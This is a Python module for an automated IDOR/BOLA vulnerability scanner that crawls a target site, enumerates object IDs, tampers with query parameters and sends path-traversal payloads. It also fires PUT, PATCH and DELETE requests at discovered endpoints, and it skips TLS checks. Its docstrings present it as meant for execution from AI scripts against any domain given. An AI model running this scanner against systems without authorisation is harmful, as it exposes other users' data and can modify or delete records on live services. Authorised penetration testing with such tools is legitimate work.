"""
Zenith IDOR Scanner Module - Insecure Direct Object Reference Detection
The #1 most reported bug bounty vulnerability worldwide.

Automatically detects and tests IDOR vulnerabilities by:
1. Discovering API endpoints and parameters
2. Manipulating ID/reference parameters (numeric, UUID, sequential)
3. Comparing responses to detect unauthorized data access
4. Testing horizontal and vertical privilege escalation

Usage from AI scripts:
    from zenith.modules.idor_scanner import IDORScanner
    scanner = IDORScanner("target.com")
    results = scanner.scan()
"""

import urllib.request
import urllib.parse
import urllib.error
import ssl
import json
import re
import hashlib
import concurrent.futures
from collections import defaultdict


class IDORScanner:
    """Automated IDOR vulnerability scanner."""

    # Parameters commonly vulnerable to IDOR
    IDOR_PARAMS = [
        'id', 'uid', 'user_id', 'userId', 'account_id', 'accountId',
        'profile_id', 'profileId', 'order_id', 'orderId', 'doc_id',
        'docId', 'file_id', 'fileId', 'invoice_id', 'invoiceId',
        'report_id', 'reportId', 'ticket_id', 'ticketId', 'msg_id',
        'messageId', 'transaction_id', 'txn_id', 'ref', 'reference',
        'num', 'number', 'no', 'key', 'token', 'pid', 'cid', 'oid',
        'item', 'item_id', 'product_id', 'productId', 'post_id',
        'comment_id', 'review_id', 'payment_id', 'subscription_id',
    ]

    # Common API path patterns with object references
    API_PATTERNS = [
        '/api/v{ver}/users/{id}',
        '/api/v{ver}/user/{id}',
        '/api/v{ver}/accounts/{id}',
        '/api/v{ver}/orders/{id}',
        '/api/v{ver}/invoices/{id}',
        '/api/v{ver}/documents/{id}',
        '/api/v{ver}/files/{id}',
        '/api/v{ver}/messages/{id}',
        '/api/v{ver}/profiles/{id}',
        '/api/v{ver}/payments/{id}',
        '/api/users/{id}',
        '/api/user/{id}',
        '/api/account/{id}',
        '/api/orders/{id}',
        '/api/profile/{id}',
        '/user/{id}',
        '/users/{id}',
        '/account/{id}',
        '/profile/{id}',
        '/order/{id}',
        '/invoice/{id}',
        '/download/{id}',
        '/file/{id}',
        '/document/{id}',
        '/v1/users/{id}',
        '/v2/users/{id}',
    ]

    def __init__(self, target, base_url=None, cookies=None, headers=None, timeout=10):
        self.target = target
        self.base_url = base_url or f"https://{target}"
        self.timeout = timeout
        self.ctx = ssl._create_unverified_context()
        self.findings = []
        self.tested = 0
        self.cookies = cookies or ""
        self.custom_headers = headers or {}

    def _request(self, url, method="GET", data=None):
        """Make HTTP request with error handling."""
        try:
            hdrs = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/html, */*',
            }
            hdrs.update(self.custom_headers)
            if self.cookies:
                hdrs['Cookie'] = self.cookies

            if data and isinstance(data, dict):
                data = json.dumps(data).encode()
                hdrs['Content-Type'] = 'application/json'

            req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
            resp = urllib.request.urlopen(req, context=self.ctx, timeout=self.timeout)
            body = resp.read(100000).decode(errors='ignore')
            return {
                'status': resp.status,
                'body': body,
                'headers': dict(resp.getheaders()),
                'length': len(body),
                'hash': hashlib.md5(body.encode()).hexdigest()[:16],
            }
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read(10000).decode(errors='ignore')
            except:
                pass
            return {
                'status': e.code,
                'body': body,
                'headers': dict(e.headers) if hasattr(e, 'headers') else {},
                'length': len(body),
                'hash': hashlib.md5(body.encode()).hexdigest()[:16],
            }
        except Exception as e:
            return {'status': 0, 'body': str(e), 'headers': {}, 'length': 0, 'hash': ''}

    def _discover_endpoints(self):
        """Crawl target to discover API endpoints with parameters."""
        endpoints = set()
        print(f"  [*] Crawling {self.base_url} for endpoints...")

        # Fetch main page and look for API calls
        resp = self._request(self.base_url)
        if resp['body']:
            # Find URLs in page source
            urls = re.findall(r'(?:href|action|src|url|endpoint)["\s:=]+["\']?([^"\'>\s]+)', resp['body'], re.I)
            # Find API endpoints in JavaScript
            api_urls = re.findall(r'["\'](/(?:api|v[0-9]|rest|graphql)[^"\']*)["\']', resp['body'])
            # Find fetch/axios/xhr calls
            ajax_urls = re.findall(r'(?:fetch|axios|\.get|\.post|\.put|\.delete)\s*\(\s*[`"\']([^`"\']+)', resp['body'])

            for url_list in [urls, api_urls, ajax_urls]:
                for u in url_list:
                    if u.startswith('/'):
                        endpoints.add(u)
                    elif self.target in u:
                        parsed = urllib.parse.urlparse(u)
                        endpoints.add(parsed.path + ('?' + parsed.query if parsed.query else ''))

        # Check common API paths
        for pattern in self.API_PATTERNS:
            for ver in ['1', '2', '3']:
                for test_id in ['1', '2']:
                    path = pattern.replace('{ver}', ver).replace('{id}', test_id)
                    resp = self._request(f"{self.base_url}{path}")
                    if resp['status'] in (200, 201, 301, 302, 401, 403):
                        endpoints.add(path.replace(test_id, '{id}'))
                        print(f"  [+] Found endpoint: {path} [{resp['status']}]")

        # Check robots.txt and sitemap for more paths
        for meta_path in ['/robots.txt', '/sitemap.xml']:
            resp = self._request(f"{self.base_url}{meta_path}")
            if resp['status'] == 200:
                paths = re.findall(r'(?:Disallow|Allow|<loc>)\s*:?\s*(/?[^\s<]+)', resp['body'])
                for p in paths:
                    if any(char in p for char in ['id', 'user', 'account', 'profile', 'order']):
                        endpoints.add(p)

        return endpoints

    def _test_numeric_idor(self, url_template, param_name=None):
        """Test IDOR by incrementing/decrementing numeric IDs."""
        results = []
        base_ids = [1, 2, 3, 100, 1000]

        for base_id in base_ids:
            test_ids = [base_id - 1, base_id, base_id + 1, base_id + 10, base_id + 100]
            responses = {}

            for test_id in test_ids:
                if test_id < 0:
                    continue
                if param_name:
                    url = f"{url_template}?{param_name}={test_id}"
                else:
                    url = url_template.replace('{id}', str(test_id))

                resp = self._request(url)
                self.tested += 1
                responses[test_id] = resp

            # Analyze: if different IDs return different 200 responses, it's likely IDOR
            success_responses = {k: v for k, v in responses.items() if v['status'] == 200}
            if len(success_responses) >= 2:
                hashes = set(v['hash'] for v in success_responses.values())
                if len(hashes) >= 2:  # Different content for different IDs
                    results.append({
                        'type': 'IDOR',
                        'severity': 'HIGH',
                        'url': url_template,
                        'param': param_name or 'path_id',
                        'detail': f"Different responses for IDs {list(success_responses.keys())} - possible IDOR",
                        'ids_tested': list(success_responses.keys()),
                        'response_hashes': list(hashes),
                    })

        return results

    def _test_param_idor(self, base_url, params):
        """Test IDOR on URL query parameters."""
        results = []
        parsed = urllib.parse.urlparse(base_url)
        query_params = urllib.parse.parse_qs(parsed.query)

        for param, values in query_params.items():
            if param.lower() in [p.lower() for p in self.IDOR_PARAMS]:
                original_value = values[0]
                print(f"  [*] Testing IDOR on param: {param}={original_value}")

                # Try modifying the value
                test_values = []
                try:
                    num = int(original_value)
                    test_values = [str(num - 1), str(num + 1), str(num + 10), '0', '999999']
                except ValueError:
                    # UUID or string - try variations
                    test_values = ['1', '0', 'admin', 'test', original_value + '1']

                original_resp = self._request(base_url)

                for test_val in test_values:
                    modified_params = query_params.copy()
                    modified_params[param] = [test_val]
                    new_query = urllib.parse.urlencode(modified_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                    resp = self._request(test_url)
                    self.tested += 1

                    if resp['status'] == 200 and resp['hash'] != original_resp['hash']:
                        results.append({
                            'type': 'IDOR',
                            'severity': 'HIGH',
                            'url': test_url,
                            'param': param,
                            'original_value': original_value,
                            'test_value': test_val,
                            'detail': f"Param {param} changed from {original_value} to {test_val} returned different data",
                        })

        return results

    def _test_method_idor(self, url):
        """Test if changing HTTP method bypasses access controls (BOLA)."""
        results = []
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']

        for method in methods:
            resp = self._request(url, method=method)
            self.tested += 1
            if resp['status'] in (200, 201, 204) and method in ('PUT', 'PATCH', 'DELETE'):
                results.append({
                    'type': 'BOLA',
                    'severity': 'CRITICAL',
                    'url': url,
                    'method': method,
                    'detail': f"HTTP {method} returned {resp['status']} - potential unauthorized modification/deletion",
                })

        return results

    def _test_path_traversal_idor(self, url):
        """Test IDOR via path traversal in object references."""
        results = []
        traversal_payloads = [
            '../', '..%2f', '..%252f', '..../', '..;/',
            '%2e%2e/', '%2e%2e%2f',
        ]

        # Find numeric IDs in URL path
        path_parts = url.split('/')
        for i, part in enumerate(path_parts):
            if part.isdigit():
                for payload in traversal_payloads:
                    modified_parts = path_parts.copy()
                    modified_parts[i] = payload + part
                    test_url = '/'.join(modified_parts)
                    resp = self._request(test_url)
                    self.tested += 1
                    if resp['status'] == 200:
                        results.append({
                            'type': 'PATH_TRAVERSAL_IDOR',
                            'severity': 'HIGH',
                            'url': test_url,
                            'detail': f"Path traversal + IDOR: {payload} returned 200",
                        })

        return results

    def scan(self):
        """Run the full IDOR scan."""
        print(f"\n{'='*60}")
        print(f"  IDOR/BOLA Scanner - {self.target}")
        print(f"{'='*60}")

        # Phase 1: Discover endpoints
        print(f"\n[Phase 1] Endpoint Discovery")
        endpoints = self._discover_endpoints()
        print(f"  [*] Found {len(endpoints)} potential endpoints")

        # Phase 2: Test each endpoint for IDOR
        print(f"\n[Phase 2] IDOR Testing")
        all_findings = []

        for endpoint in endpoints:
            full_url = f"{self.base_url}{endpoint}" if endpoint.startswith('/') else endpoint

            # Test numeric ID manipulation
            if '{id}' in endpoint or re.search(r'/\d+', endpoint):
                findings = self._test_numeric_idor(full_url)
                all_findings.extend(findings)

            # Test query parameter IDOR
            if '?' in endpoint:
                findings = self._test_param_idor(full_url, {})
                all_findings.extend(findings)

            # Test HTTP method-based IDOR (BOLA)
            findings = self._test_method_idor(full_url)
            all_findings.extend(findings)

            # Test path traversal IDOR
            findings = self._test_path_traversal_idor(full_url)
            all_findings.extend(findings)

        # Phase 3: Test common API IDOR patterns directly
        print(f"\n[Phase 3] Common API IDOR Patterns")
        for pattern in self.API_PATTERNS[:10]:
            for ver in ['1', '2']:
                url_template = f"{self.base_url}{pattern.replace('{ver}', ver)}"
                findings = self._test_numeric_idor(url_template)
                all_findings.extend(findings)

        self.findings = all_findings

        # Report
        print(f"\n{'='*60}")
        print(f"  IDOR SCAN RESULTS")
        print(f"{'='*60}")
        print(f"  Requests made: {self.tested}")
        print(f"  Findings: {len(all_findings)}")

        if all_findings:
            for i, f in enumerate(all_findings, 1):
                sev = f.get('severity', 'INFO')
                sev_icon = '🔴' if sev == 'CRITICAL' else '🟠' if sev == 'HIGH' else '🟡'
                print(f"\n  {sev_icon} [{sev}] Finding #{i}: {f['type']}")
                print(f"     URL: {f.get('url', 'N/A')}")
                print(f"     Detail: {f.get('detail', 'N/A')}")
                if f.get('param'):
                    print(f"     Parameter: {f['param']}")
                if f.get('method'):
                    print(f"     Method: {f['method']}")
        else:
            print(f"\n  ✓ No obvious IDOR vulnerabilities detected.")
            print(f"  Note: Manual testing with valid session tokens recommended.")

        return all_findings


# CLI entry point for AI script execution
if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_DOMAIN"
    cookies = sys.argv[2] if len(sys.argv) > 2 else ""
    scanner = IDORScanner(target, cookies=cookies)
    results = scanner.scan()
    if results:
        print(f"\n⚠ TOTAL IDOR FINDINGS: {len(results)}")
        for r in results:
            print(json.dumps(r, indent=2))
